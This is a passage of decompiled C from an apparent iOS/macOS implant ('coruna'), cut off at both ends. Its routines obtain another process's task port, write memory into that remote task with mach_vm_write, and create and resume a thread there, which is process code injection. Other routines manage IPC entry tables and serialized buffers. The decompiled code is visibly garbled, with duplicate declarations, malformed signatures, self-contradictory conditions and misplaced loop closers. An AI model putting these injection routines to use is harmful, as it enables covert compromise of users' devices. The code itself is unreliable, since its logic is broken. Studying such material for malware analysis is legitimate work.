  __Block_object_assign((void *)(handle + 0x20),*(void **)(addr_2 + 0x20),8);
  __Block_object_assign((void *)(handle + 0x28),*(void **)(addr_2 + 0x28),8);
  return;
}





void coruna_block_dispose_1bf78(long handle)
{
  __Block_object_dispose(*(void **)(handle + 0x28),8);
  __Block_object_dispose(*(void **)(handle + 0x20),8);
  return;
}





uint8_t * coruna_task_info_1bfa8(task_name_t arg,long handle)
{
  kern_return_t lk1;
  uint8_t *ptr;
  mach_msg_type_number_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint host_info;
  
  bootargs = 0;
  thread_attr = 0;
  host_info = 0;
  scratch = 5;
  if (handle == 0) {
    ptr = (uint8_t *)0xad001;
  }
  else if (arg + 1 < 2) {
    ptr = &k_implant_rodata_word_1e009;
  }
  else {
    lk1 = _task_info(arg,0x11,(task_info_t)&bootargs,&scratch);
    ptr = &k_implant_rodata_word_1e002;
    if ((lk1 == 0) && (scratch == 5)) {
      if ((bootargs == 0) || (0xc800 < thread_attr)) {
        ptr = &k_implant_rodata_word_1e001;
      }
      else {
        ptr = &k_implant_rodata_word_1e001;
        if (host_info < 2) {
          ptr = (uint8_t *)0x0;
          *(bool *)handle = host_info == 1;
          *(bool *)(handle + 1) = host_info == 1;
          *(long *)(handle + 8) = bootargs;
          *(unsigned long *)(handle + 0x10) = thread_attr;
        }
      }
    }
  }
  return ptr;
}





uint32_t coruna_mach_vm_write(vm_map_t arg,mach_vm_address_t arg_x,uint size)
{
  uint dataCnt;
  kern_return_t lk1;
  void *data;
  uint u;
  uint32_t size;
  int err;
  
  if ((((arg_x != 0) || (size = 0xad001, size == 0)) && (size = 0x1e009, 1 < arg + 1)) &&
     (size = 0, size != 0)) {
    u = size;
    if (0xfff < size) {
      u = 0x1000;
    }
    data = _calloc((unsigned long)size,1);
    if (data == (void *)0x0) {
      size = 0xad009;
    }
    else {
      err = 0;
      do {
        dataCnt = size;
        if (u <= size) {
          dataCnt = u;
        }
        lk1 = _mach_vm_write(arg,arg_x,(vm_offset_t)data,dataCnt);
        if (lk1 != 0) {
          err = lk1;
        }
        arg_x = arg_x + dataCnt;
        size = size - dataCnt;
      } while (size != 0);
      size = 0;
      if (err != 0) {
        size = 0x1e00f;
      }
      _free(data);
    }
  }
  return size;
}





uint8_t * coruna_mach_vm_write_1c15c(short *arg,long handle,vm_map_t arg_x,int flags,uint64_t val,
            unsigned long *arg_x_x,unsigned long arg,uint size)
{
  uint u;
  int err;
  kern_return_t lk3;
  uint32_t size;
  uint8_t *ptr;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long thread_attr;
  unsigned long host_info;
  unsigned long host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t action;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t block_ctx;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t stack_guard;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_saved;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  unsigned long sa_new;
  long path_buf;
  unsigned long cache_22;
  uint64_t cache_23;
  uint64_t tmp_buf;
  uint64_t region;
  uint8_t *plist;
  uint32_t url_buf;
  long json_buf;
  
  json_buf = *(long *)k_implant_stack_chk_guard_slot;
  ptr = (uint8_t *)0xad00a;
  if (((arg != (short *)0x0) && (*arg == 2)) && (1 < (ushort)arg[1] && handle != 0)) {
    ptr = &k_implant_rodata_word_1e011;
    if (arg_x + 1 < 2) {
      ptr = &k_implant_rodata_word_1e009;
    }
    else if (flags + 1U < 2) {
      ptr = &k_implant_rodata_word_1e014;
    }
    else {
      err = coruna_port_name_valid(arg_x_x,val);
      if (err == 0) {
        ptr = &k_implant_rodata_word_1e010;
      }
      else if (((arg != 0) &&
               (((uint)(arg >> 0x20 != 0) & ((uint)val ^ 0xffffffff)) == 0)) &&
              (0x24f < size)) {
        path_buf = 0;
        sa_new = 0;
        cache_23 = 0;
        cache_22 = 0;
        cache = 0;
        sa_saved = 0;
        cache_21 = 0;
        cache_20 = 0;
        json_buf = 0;
        stack_guard = 0;
        work = 0;
        frame = 0;
        region = 0;
        block_ctx = 0;
        url_buf = 0;
        plist = 0;
        sa_new = 0;
        action = 0;
        tmp_buf = 0;
        path_buf = 0;
        block_ctx = 0;
        serial_buf = 0;
        sa_saved = 0;
        stack_guard = 0;
        action = 0;
        serial_buf = 0;
        bootargs = 0;
        bootargs = 0;
        thread_attr = 0;
        thread_attr = 0;
        if ((uint)val == 0) {
          tmp_buf = coruna_u64_pack(((int)arg_x_x[7]), (int)arg_x_x[6]);
          region = coruna_u64_pack(((int)arg_x_x[9]), (int)arg_x_x[8]);
          u = (size + (int)arg) - 0x110;
          scratch = coruna_u64_pack(((int)arg_x_x[3]), (int)arg_x_x[2]);
          scratch = coruna_u64_pack(((int)arg_x_x[5]), (int)arg_x_x[4]);
          host_info = (unsigned long)u << 0x20;
          size = (uint32_t)*arg_x_x;
          host_info = NEON_rev64(coruna_u64_pack(((int)arg_x_x[1]), (size)),4);
          if ((*arg_x_x & 1) != 0) {
            host_info = coruna_u64_pack((size), ((uint32_t))host_info) & 0xfffffffeffffffff;
            serial_buf = 0x20;
          }
          lk3 = _mach_vm_write(arg_x,(unsigned long)u,(vm_offset_t)&tmp_buf,0x10);
          if (lk3 != 0) {
            ptr = &k_implant_rodata_word_1e00e;
            if (*(long *)k_implant_stack_chk_guard_slot == json_buf) {
            return ptr;
            }
            ___stack_chk_fail();
          }
          size = 1;
          url_buf = 0x11;
        }
        else {
          scratch = arg_x_x[3];
          scratch = arg_x_x[2];
          bootargs = arg_x_x[5];
          bootargs = arg_x_x[4];
          path_buf = arg + size + -0x180;
          thread_attr = arg_x_x[7];
          thread_attr = arg_x_x[6];
          host_info = arg_x_x[9];
          host_info = arg_x_x[8];
          cache_22 = *arg_x_x;
          sa_new = arg_x_x[1];
          size = 6;
          url_buf = 0x44;
        }
        tmp_buf = coruna_u64_pack((flags), (arg_x));
        region = coruna_u64_pack((region), (size));
        plist = (uint8_t *)&scratch;
        ptr = (uint8_t *)(**(void (**)(arg + 0x14))(arg,handle,0x4000001e,&tmp_buf);
      }
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == json_buf) {
    return ptr;
  }
  ___stack_chk_fail();
}





bool coruna_port_name_valid(unsigned long *arg,uint size)
{
  unsigned long u;
  
  if (arg != (unsigned long *)0x0) {
    u = *arg;
    if (u == 0) {
      return false;
    }
    if ((size & 1) != 0) {
      return u != 0;
    }
    if ((((((u >> 0x20 == 0) && (*(int *)((long)arg + 0xc) == 0)) &&
          (*(int *)((long)arg + 0x14) == 0)) &&
         ((*(int *)((long)arg + 0x1c) == 0 && (*(int *)((long)arg + 0x24) == 0)))) &&
        ((*(int *)((long)arg + 0x2c) == 0 &&
         ((*(int *)((long)arg + 0x34) == 0 && (*(int *)((long)arg + 0x3c) == 0)))))) &&
       (*(int *)((long)arg + 0x44) == 0)) {
      return *(int *)((long)arg + 0x4c) == 0;
    }
  }
  return false;
}





uint8_t * coruna_mach_port_deallocate_1c3fc(short *arg,long handle,uint64_t val,uint64_t id_2,uint64_t size_3,
            unsigned long arg_x,uint64_t off_4)
{
  int err;
  kern_return_t lk2;
  uint8_t *ptr;
  thread_act_t scratch [3];
  
  if (arg == (short *)0x0) {
    return (uint8_t *)0xad00a;
  }
  if (*arg != 2) {
    return (uint8_t *)0xad00a;
  }
  if ((ushort)arg[1] < 2 || handle == 0) {
    return (uint8_t *)0xad00a;
  }
  if ((task_t)val + 1 < 2) {
    return &k_implant_rodata_word_1e009;
  }
  err = coruna_port_name_valid(size_3,id_2);
  if (err == 0) {
    return &k_implant_rodata_word_1e010;
  }
  if (arg_x == 0) {
    return &k_implant_rodata_word_1e011;
  }
  if (((uint)(arg_x >> 0x20 != 0) & ((uint)id_2 ^ 0xffffffff)) != 0) {
    return &k_implant_rodata_word_1e011;
  }
  if ((uint)off_4 < 0x250) {
    return &k_implant_rodata_word_1e011;
  }
  scratch[0] = 0;
  lk2 = _thread_create((task_t)val,scratch);
  if (lk2 != 0) {
    return &UNK_0001e00c;
  }
  if (scratch[0] + 1 < 2) {
    return &UNK_0001e00c;
  }
  ptr = (uint8_t *)
           coruna_mach_vm_write_1c15c(arg,handle,val,scratch[0],id_2,size_3,arg_x,off_4);
  if ((int)ptr == 0) {
    scratch[1] = 0x7f;
    if (1 < scratch[0] + 1) {
      _thread_policy_set(scratch[0],3,(thread_policy_t)(scratch + 1),1);
    }
    lk2 = _thread_resume(scratch[0]);
    if (lk2 == 0) {
      ptr = (uint8_t *)0x0;
      _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch[0]);
      return ptr;
    }
    ptr = &k_implant_rodata_word_1e013;
  }
  _thread_terminate(scratch[0]);
code_r0x0001c534:
  _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch[0]);
  return ptr;
}





void coruna_task_for_pid(long *handle,int flags,uint32_t *size)
{
  pid_t lp1;
  uint64_t u;
  uint32_t size;
  int scratch;
  uint32_t bootargs;
  uint32_t thread_attr[2];
  uint8_t *host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if (((handle != (long *)0x0) && (0 < flags)) && (size != (uint32_t *)0x0)) {
    lp1 = _getpid();
    if (lp1 == flags) {
      u = 0;
      size = *(uint32_t *)k_implant_mach_task_self_slot;
    }
    else {
      bootargs = 0;
      thread_attr[0] = 0xc000001d;
      scratch = flags;
      host_info = (uint8_t *)&scratch;
      u = (**(void (**)(*handle + 0x40))(*handle,handle + 1,thread_attr,1,0);
      size = bootargs;
      if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
      ___stack_chk_fail(u);
      }
      return;
    }
    *size = size;
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}





void coruna_implant65fc_residual_122(long *handle,uint size)
{
  uint64_t u;
  uint32_t scratch[2];
  unsigned long bootargs;
  uint32_t thread_attr;
  unsigned long host_info;
  uint32_t serial_buf;
  unsigned long action;
  uint32_t block_ctx;
  unsigned long stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad001;
  if (((handle != (long *)0x0) && (size != 0)) && (size != 0xffffffff)) {
    scratch[0] = 0x15;
    bootargs = (unsigned long)size;
    thread_attr = 0x1f;
    serial_buf = 0x22;
    block_ctx = 0x17;
    host_info = bootargs;
    action = bootargs;
    stack_guard = bootargs;
    u = (**(void (**)(*handle + 0x40))(*handle,handle + 1,scratch,4,0);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == sa_saved) {
    return;
  }
  ___stack_chk_fail(u);
}





int coruna_rwlock_iface_destroy(long *handle)
{
  int err;
  int status;
  
  if (handle == (long *)0x0) {
    status = 0xad001;
  }
  else {
    if (handle[1] == 0) {
      status = 0;
    }
    else {
      err = (**(void (**)(*handle + 0x30))();
      status = (**(void (**)(*handle + 0x20))(*handle,handle[1]);
      if (err != 0) {
        status = err;
      }
    }
    *handle = 0;
    handle[1] = 0;
    _free(handle);
  }
  return status;
}





uint64_t coruna_implant65fc_via_pthread_rwlock_init(uint64_t *val)
{
  uint64_t u;
  uint32_t *ptr;
  uint64_t scratch;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    scratch = 0;
    u = coruna_pthread_rwlock_init(&scratch);
    if ((int)u == 0) {
      ptr = _calloc(1,0x38);
      if (ptr == (uint32_t *)0x0) {
        coruna_pthread_rwlock_destroy(scratch);
        u = 0xad009;
      }
      else {
        u = 0;
        *ptr = 0x10001;
        *(uint64_t *)(ptr + 2) = scratch;
        ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_pthread_rwlock_unlock_1cbc8;
        ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_pthread_rwlock_rdlock;
        ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_pthread_rwlock_rdlock_1cd00;
        ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_pthread_rwlock_rdlock_1cd7c;
        ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_pthread_rwlock_unlock_1ce64;
        *val = ptr;
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_ctx_free_1c8fc(long *handle,int *flags,unsigned long arg)
{
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = 0xad001;
  if (((handle != (long *)0x0) && (flags != (int *)0x0)) && ((uint)arg != 0)) {
    if ((((uint)arg < 9) || (*flags != -0xff24111)) ||
       ((flags[1] == 0 || ((arg & 0xffffffff) <= ((unsigned long)(uint)flags[1] << 4 | 8))))) {
      u = 0x700b;
    }
    else {
      u = coruna_implant65fc_via_pthread_rwlock_init(&scratch);
      if ((int)u == 0) {
        u = (**(void (**)(scratch + 0x10))(scratch,flags,arg);
        if ((int)u == 0) {
          *handle = scratch;
        }
        else {
          coruna_ctx_free_1c8fc();
        }
      }
    }
  }
  return u;
}





uint64_t coruna_ctx_free_1c8fc(uint64_t *val)
{
  uint64_t u;
  
  if ((val == (uint64_t *)0x0) || (val[1] == 0)) {
    u = 0xad001;
  }
  else {
    u = coruna_pthread_rwlock_destroy();
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    _free(val);
  }
  return u;
}





unsigned long coruna_implant65fc_via_ipc_resolve_entry(long *arg,long val)

{
  uint *entry_9;
  int j;
  uint type_id_8;
  bool j;
  int count;
  void *entry_17;
  long serial;
  long serial_13;
  long serial_14;
  long serial_15;
  unsigned long type_id_14;
  unsigned long type_id_15;
  uint cache_36;
  void *host_info;
  long serial_buf;
  
  type_id_14 = 0xad001;
  serial_buf = 0;
  if (((arg != (long *)0x0) && (val != 0)) &&
     (type_id_14 = coruna_implant65fc_via_pthread_rwlock_init(&serial_buf,0x18), (int)type_id_14 == 0)) {
    serial_15 = *(long *)(serial_buf + 8);
    type_id_15 = 0;
    do {
      count = *(int *)(val + type_id_15 * 0x30 + 0x140);
      if (count == 0) {
load_ok_61:
        type_id_14 = 0;
      }
      else {
        serial_14 = val + type_id_15 * 0x30;
        serial = *(long *)(serial_14 + 0x148);
        if (serial == 0) {
          type_id_14 = 0xad014;
          goto load_ok_62;
        }
        serial_13 = val + type_id_15 * 0x30;
        j = *(int *)(serial_13 + 0x150);
        if (j == 0 || serial_15 == 0) {
          type_id_8 = 0xad014;
          if (j != 0) {
            type_id_8 = 0xad001;
          }
          type_id_14 = (unsigned long)type_id_8;
          goto load_ok_62;
        }
        entry_9 = (uint *)(serial_13 + 0x150);
        type_id_8 = *(uint *)(serial_15 + 0xe8);
        if (type_id_8 != 0) {
          serial_13 = 0;
          do {
            if (*(int *)(serial_15 + 0xf0 + serial_13) == count) {
              host_info = (void *)0x0;
              cache_36 = 0;
              type_id_14 = coruna_ipc_resolve_entry(serial_15,serial_15 + 0xf0 + serial_13,&host_info,&cache_36);
              if ((int)type_id_14 != 0) goto load_ok_63;
              entry_17 = *(void **)(serial_14 + 0x148);
              type_id_8 = *entry_9;
              if ((host_info == entry_17 && cache_36 == type_id_8) ||
                 ((cache_36 == type_id_8 &&
                  (count = _memcmp(host_info,entry_17,(unsigned long)cache_36), count == 0))))
              goto load_ok_61;
              type_id_14 = 0x700a;
              goto load_ok_63;
            }
            serial_13 = serial_13 + 0x20;
          } while ((unsigned long)type_id_8 * 0x20 - serial_13 != 0);
        }
        if (*(uint *)(serial_15 + 0xe4) <= type_id_8) {
          type_id_14 = 0x7006;
          goto load_ok_62;
        }
        type_id_14 = 0;
        serial_14 = serial_15 + (unsigned long)type_id_8 * 0x20;
        *(int *)(serial_14 + 0xf0) = count;
        *(uint8_t *)(serial_14 + 0xf8) = 2;
        *(long *)(serial_14 + 0x100) = serial;
        *(uint *)(serial_14 + 0x108) = *entry_9;
        *(uint *)(serial_15 + 0xe8) = type_id_8 + 1;
      }
load_ok_63:
    } while (((int)type_id_14 == 0) && (j = type_id_15 < 0x17, type_id_15 = type_id_15 + 1, j));
    if ((int)type_id_14 == 0) {
      *arg = serial_buf;
    }
    else {
load_ok_62:
      coruna_ctx_free_1c8fc(serial_buf);
    }
  }
  return type_id_14;
}





uint64_t coruna_pthread_rwlock_unlock(short *arg,uint64_t val,long handle,uint64_t id_2)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((((arg != (short *)0x0) && (*arg == 1)) && (arg[1] != 0)) &&
     (((ptr = *(pthread_rwlock_t **)(arg + 4), ptr != (pthread_rwlock_t *)0x0 &&
       ((int)val != 0)) && ((handle != 0 && ((int)id_2 != 0)))))) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_implant65fc_via_ipc_resolve_entry_2(ptr,val,handle,id_2,0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_unlock_1cbc8(long handle,long addr_2,uint64_t val)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && (int)val != 0)) {
    err = _pthread_rwlock_wrlock(ptr);
    if (err == 0) {
      u = coruna_return_zero_1d074(ptr,2,addr_2,val);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock(long handle,int flags,long addr_2,long off_3)
{
  int err;
  char *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ((ptr != (pthread_rwlock_t *)0x0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
      if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
        ptr = ptr[1].__opaque;
        do {
          ptr = ptr + 0x20;
          if (*(int *)ptr == flags) {
            size = coruna_ipc_resolve_entry(ptr,ptr,addr_2,off_3);
            goto fail;
          }
          u = u - 1;
        } while (u != 0);
      }
      size = 0x7003;
fail:
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_rdlock_1cd00(long handle,long addr_2,long off_3)
{
  int err;
  uint64_t u;
  pthread_rwlock_t *ptr;
  
  u = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     (ptr != (pthread_rwlock_t *)0x0 && addr_2 != 0) && off_3 != 0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      u = coruna_bzero_7(ptr,addr_2,off_3);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      u = 0xad020;
    }
  }
  return u;
}





uint64_t coruna_pthread_rwlock_rdlock_1cd7c(long handle,void (*val,uint64_t val)
{
  uint32_t u;
  int err;
  pthread_rwlock_t *ptr;
  uint64_t size;
  char *ptr;
  unsigned long version;
  uint32_t scratch;
  uint64_t bootargs;
  
  size = 0xad001;
  if ((handle != 0) &&
     (ptr = *(pthread_rwlock_t **)(handle + 8),
     ptr != (pthread_rwlock_t *)0x0 && arg != (void (*)0x0)) {
    err = _pthread_rwlock_rdlock(ptr);
    if (err == 0) {
      ptr = ptr[1].__opaque;
      version = 0xffffffffffffffff;
      do {
        ptr = ptr + 0x20;
        version = version + 1;
        if (*(uint *)(ptr[1].__opaque + 0x18) <= version) {
          size = 0;
          break;
        }
        u = *(uint32_t *)ptr;
        bootargs = 0;
        scratch = 0;
        size = coruna_ipc_resolve_entry(ptr,ptr,&bootargs,&scratch);
        if ((int)size != 0) break;
        size = (*arg)(handle,u,bootargs,scratch,val);
      } while ((int)size == 0);
      _pthread_rwlock_unlock(ptr);
    }
    else {
      size = 0xad020;
    }
  }
  return size;
}





uint64_t coruna_pthread_rwlock_unlock_1ce64(long handle,uint64_t val,void *ctx,uint size)
{
  int err;
  void *ptr;
  unsigned long u;
  pthread_rwlock_t *ptr;
  uint64_t size;
  void *buf;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if (handle != 0) {
    ptr = *(pthread_rwlock_t **)(handle + 8);
    if (((ptr != (pthread_rwlock_t *)0x0 && (uint)val != 0) && ctx != (void *)0x0) &&
        size != 0) {
      err = _pthread_rwlock_wrlock(ptr);
      if (err == 0) {
        u = (unsigned long)*(uint *)(ptr[1].__opaque + 0x18);
        if (*(uint *)(ptr[1].__opaque + 0x18) != 0) {
          ptr = ptr[1].__opaque + 0x38;
          do {
            if (*(uint *)(ptr + -0x18) == (uint)val) {
              ptr = _malloc((unsigned long)size);
              if (ptr == (void *)0x0) {
                size = 0xad009;
              }
              else {
                _memcpy(ptr,ctx,(unsigned long)size);
                if (ptr[-0x10] == '\x03') {
                  buf = *(void **)(ptr + -8);
                  _bzero(buf,(unsigned long)*(uint *)ptr);
                  _free(buf);
                }
                else if (ptr[-0x10] == '\x01') {
                  _bzero((void *)(*(long *)(ptr[1].__opaque + 8) + *(long *)(ptr + -8)),
                         (unsigned long)*(uint *)ptr);
                }
                ptr[-0x10] = '\x03';
                *(void **)(ptr + -8) = ptr;
                *(uint *)ptr = size;
                if (ptr[1].__sig == 0) {
                  size = 0;
                }
                else {
                  bootargs = (void *)0x0;
                  scratch = 0;
                  size = coruna_bzero_7(ptr,&bootargs,&scratch);
                  if ((int)size == 0) {
                    size = (*(void (*)ptr[1].__sig)
                                      (val,bootargs,scratch,*(uint64_t *)ptr[1].__opaque);
                    _bzero(bootargs,(unsigned long)scratch);
                    _free(bootargs);
                  }
                }
              }
              goto fail;
            }
            ptr = ptr + 0x20;
            u = u - 1;
          } while (u != 0);
        }
        size = 0x7003;
fail:
        _pthread_rwlock_unlock(ptr);
      }
      else {
        size = 0xad020;
      }
    }
  }
  return size;
}





uint64_t coruna_ipc_resolve_entry(long handle,long addr_2,long *off_3,uint32_t *size)
{
  char err;
  uint64_t u;
  long handle;
  
  u = 0xad001;
  if ((((handle != 0) && (addr_2 != 0)) && (off_3 != (long *)0x0)) &&
     (size != (uint32_t *)0x0)) {
    err = *(char *)(addr_2 + 8);
    if ((err == '\x03') || (err == '\x02')) {
      handle = *(long *)(addr_2 + 0x10);
      if (handle == 0) {
        return 0xad014;
      }
    }
    else {
      if (err != '\x01') {
        return 0x700c;
      }
      if (*(long *)(handle + 0xd8) == 0) {
        return 0xad014;
      }
      handle = *(long *)(handle + 0xd8) + *(long *)(addr_2 + 0x10);
    }
    u = 0;
    *off_3 = handle;
    *size = *(uint32_t *)(addr_2 + 0x18);
  }
  return u;
}





unsigned long coruna_return_zero_1d074(long arg,int val,int *n,uint m)

{
  uint u;
  int *flags;
  int flags;
  uint version;
  unsigned long port;
  unsigned long tag;
  long serial;
  unsigned long type_id_13;
  int *idx;
  uint *entry_10;
  unsigned long type_id_14;
  uint *entry_11;
  uint cache_46;
  void *serial_buf;
  
  if (((arg == 0) || (n == (int *)0x0)) || (m == 0)) {
load_ok_64:
    port = 0xad001;
  }
  else {
    if ((7 < m) && (*n == -0xff24111)) {
      version = n[1];
      if ((version != 0) && (port = (unsigned long)version << 4 | 8, port <= m)) {
        flags = *(int *)(arg + 0xe8);
        if ((uint)(*(int *)(arg + 0xe4) - flags) < version) {
          return 0xad009;
        }
        type_id_13 = 0;
        do {
          flags = n + type_id_13 * 4 + 2;
          if (*flags == 0) {
            return 0x700c;
          }
          entry_11 = (uint *)(flags + 2);
          version = *entry_11;
          if (version < (uint)port) {
            return 0x700c;
          }
          entry_10 = (uint *)(n + type_id_13 * 4 + 5);
          if (*entry_10 == 0) {
            return 0x700c;
          }
          u = *entry_10 + version;
          if (u <= version || m < u) {
            return 0x700c;
          }
          type_id_14 = 0xffffffffffffffff;
          idx = (int *)(arg + 0xf0);
          do {
            version = *(uint *)(arg + 0xe8);
            type_id_14 = type_id_14 + 1;
            if (version <= type_id_14) {
              if (val == 2) {
                tag = (unsigned long)(uint)(flags + (int)type_id_13);
                serial = arg + tag * 0x20;
                *(uint64_t *)(serial + 0xf0) = *(uint64_t *)flags;
                *(uint8_t *)(serial + 0xf8) = 2;
                type_id_14 = (long)n + (unsigned long)*entry_11;
              }
              else {
                if (val != 1) goto load_ok_64;
                tag = (unsigned long)(uint)(flags + (int)type_id_13);
                serial = arg + tag * 0x20;
                *(uint64_t *)(serial + 0xf0) = *(uint64_t *)flags;
                *(uint8_t *)(serial + 0xf8) = 1;
                type_id_14 = (unsigned long)*entry_11;
              }
              *(unsigned long *)(serial + 0x100) = type_id_14;
              *(uint *)(arg + tag * 0x20 + 0x108) = *entry_10;
              *(uint *)(arg + 0xe8) = version + 1;
              goto load_ok_65;
            }
            if (*flags == *idx) {
              serial_buf = (void *)0x0;
              cache_46 = 0;
              tag = coruna_ipc_resolve_entry(arg,idx,&serial_buf,&cache_46);
              if ((int)tag == 0) {
                if (serial_buf == (void *)((long)n + (unsigned long)*entry_11) && cache_46 == *entry_10) {
                  tag = 0;
                }
                else {
                  if (cache_46 == *entry_10) {
                    version = _memcmp(serial_buf,(void *)((long)n + (unsigned long)*entry_11),
                                    (unsigned long)cache_46);
                    tag = (unsigned long)version;
                    idx = idx + 8;
                    } while ((int)tag == 0x7003);
                    if ((int)tag != 0) {
                    return tag;
                  }
                  tag = 0x700a;
                }
              }
            }
            else {
              tag = 0x7003;
            }
load_ok_66:
            idx = idx + 8;
          } while ((int)tag == 0x7003);
          if ((int)tag != 0) {
            return tag;
          }
load_ok_65:
          type_id_13 = type_id_13 + 1;
          if ((uint)n[1] <= type_id_13) {
            return 0;
          }
        } while( true );
      }
    }
    port = 0x700b;
  }
  return port;
}





uint64_t coruna_bzero_7(long handle,uint64_t *val,uint *size)
{
  uint u;
  int err;
  uint32_t *ptr;
  unsigned long size;
  uint64_t version;
  long handle;
  unsigned long port;
  uint64_t *buf;
  unsigned long tag;
  uint *str;
  uint scratch;
  void *bootargs;
  
  version = 0xad001;
  if (((handle != 0) && (val != (uint64_t *)0x0)) && (size != (uint *)0x0)) {
    if (*(int *)(handle + 0xe8) == 0) {
      version = 0x7007;
    }
    else {
      port = 0;
      tag = (unsigned long)(*(int *)(handle + 0xe8) * 0x10 + 0x27U & 0xffffffe0);
      handle = handle + 0xf0;
      size = tag;
      do {
        bootargs = (void *)0x0;
        scratch = 0;
        version = coruna_ipc_resolve_entry(handle,handle,&bootargs,&scratch);
        if ((int)version != 0) {
          return version;
        }
        port = port + 1;
        u = (scratch + 0x1f & 0xffffffe0) + (int)size;
        size = (unsigned long)u;
        handle = handle + 0x20;
      } while (port < *(uint *)(handle + 0xe8));
      ptr = _malloc(size);
      if (ptr == (uint32_t *)0x0) {
        version = 0xad009;
      }
      else {
        _bzero(ptr,size);
        err = *(int *)(handle + 0xe8);
        *ptr = 0xf00dbeef;
        ptr[1] = err;
        if (err != 0) {
          port = 0;
          str = ptr + 5;
          buf = (uint64_t *)(handle + 0xf0);
          do {
            bootargs = (void *)0x0;
            scratch = 0;
            version = coruna_ipc_resolve_entry(handle,buf,&bootargs,&scratch);
            if ((int)version != 0) {
              _bzero(ptr,size);
              _free(ptr);
              return version;
            }
            str[-1] = (uint)tag;
            *str = scratch;
            *(uint64_t *)(str + -3) = *buf;
            _memcpy((void *)((long)ptr + tag),bootargs,(unsigned long)scratch);
            tag = (unsigned long)((scratch + 0x1f & 0xffffffe0) + (uint)tag);
            port = port + 1;
            str = str + 4;
            buf = buf + 4;
          } while (port < *(uint *)(handle + 0xe8));
        }
        version = 0;
        *val = ptr;
        *size = u;
      }
    }
  }
  return version;
}





uint64_t coruna_implant65fc_via_ipc_resolve_entry_2(long handle,int flags,void *ctx,uint size,int count_2)
{
  uint u;
  int err;
  void *ptr;
  long handle;
  uint64_t size;
  unsigned long version;
  uint scratch;
  void *bootargs;
  
  size = 0xad001;
  if ((((handle != 0) && (flags != 0)) && (ctx != (void *)0x0)) && (size != 0)) {
    u = *(uint *)(handle + 0xe8);
    version = (unsigned long)u;
    if (u != 0) {
      handle = 0;
      do {
        if (*(int *)(handle + 0xf0 + handle) == flags) {
          bootargs = (void *)0x0;
          scratch = 0;
          size = coruna_ipc_resolve_entry(handle,handle + handle + 0xf0,&bootargs,&scratch);
          if ((int)size != 0) {
            return size;
          }
          if ((bootargs != ctx || scratch != size) &&
             ((scratch != size || (err = _memcmp(bootargs,ctx,(unsigned long)size), err != 0)
              ))) {
            return 0x700a;
          }
          return 0;
        }
        handle = handle + 0x20;
      } while (version * 0x20 - handle != 0);
    }
    if (u < *(uint *)(handle + 0xe4)) {
      if (count_2 == 0) {
        handle = handle + version * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 2;
        *(void **)(handle + 0x100) = ctx;
        *(uint *)(handle + 0x108) = size;
      }
      else {
        ptr = _malloc((unsigned long)size);
        if (ptr == (void *)0x0) {
          return 0xad009;
        }
        _memcpy(ptr,ctx,(unsigned long)size);
        handle = handle + version * 0x20;
        *(int *)(handle + 0xf0) = flags;
        *(uint8_t *)(handle + 0xf8) = 3;
        *(void **)(handle + 0x100) = ptr;
